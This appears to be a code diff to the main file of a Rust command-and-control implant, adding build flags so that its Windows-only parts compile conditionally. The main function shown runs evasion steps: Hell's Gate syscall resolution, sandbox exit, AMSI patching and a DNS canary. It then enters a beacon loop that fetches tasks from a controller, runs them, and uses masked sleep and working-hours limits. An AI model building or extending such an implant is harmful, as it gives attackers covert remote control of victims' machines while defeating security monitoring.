@@ -1,4 +1,4 @@
-#![windows_subsystem = "windows"]
+#![cfg_attr(target_os = "windows", windows_subsystem = "windows")]
 
 mod config {
     include!(concat!(env!("OUT_DIR"), "/config.rs"));
@@ -7,11 +7,16 @@ mod crypto;
 mod transport;
 mod transport_dns;
 mod transport_doh;
+#[cfg(target_os = "windows")]
 mod transport_smb;
+#[cfg(target_os = "windows")]
 mod hells_gate;
+#[cfg(target_os = "windows")]
 mod api_hash;
 mod commands;
+#[cfg(target_os = "windows")]
 mod evasion;
+#[cfg(target_os = "windows")]
 mod dotnet;
 
 use std::thread;
@@ -37,15 +42,18 @@ fn sleep_ms() -> u64 {
 }
 
 fn main() {
-    // Resolve Nt* SSNs from ntdll before any evasion or sleep calls.
-    hells_gate::init();
-    api_hash::init();
+    #[cfg(target_os = "windows")]
+    {
+        // Resolve Nt* SSNs from ntdll before any evasion or sleep calls.
+        hells_gate::init();
+        api_hash::init();
 
-    // Evasion: exit silently if running in a sandbox, then fire DNS canary
-    evasion::sandbox_check();
-    evasion::patch_amsi();
-    if !config::CANARY_DOMAIN.is_empty() {
-        evasion::dns_canary_check(config::CANARY_DOMAIN);
+        // Evasion: exit silently if running in a sandbox, then fire DNS canary
+        evasion::sandbox_check();
+        evasion::patch_amsi();
+        if !config::CANARY_DOMAIN.is_empty() {
+            evasion::dns_canary_check(config::CANARY_DOMAIN);
+        }
     }
 
     let mut t = transport::AgentTransport::new();
@@ -58,16 +66,23 @@ fn main() {
 
     // Beacon loop
     loop {
-        // Working hours enforcement — sleep 60 s and re-check if outside the window
-        if !config::WORKING_HOURS.is_empty() && !evasion::in_working_hours(config::WORKING_HOURS) {
-            evasion::sleep_masked(60_000);
-            continue;
+        #[cfg(target_os = "windows")]
+        {
+            // Working hours enforcement — sleep 60 s and re-check if outside the window
+            if !config::WORKING_HOURS.is_empty() && !evasion::in_working_hours(config::WORKING_HOURS) {
+                evasion::sleep_masked(60_000);
+                continue;
+            }
         }
 
         let tasks = t.beacon();
         for task in tasks {
             commands::dispatch(&mut t, &task);
         }
+
+        #[cfg(target_os = "windows")]
         evasion::sleep_masked(sleep_ms());
+        #[cfg(not(target_os = "windows"))]
+        thread::sleep(Duration::from_millis(sleep_ms()));
     }
 }
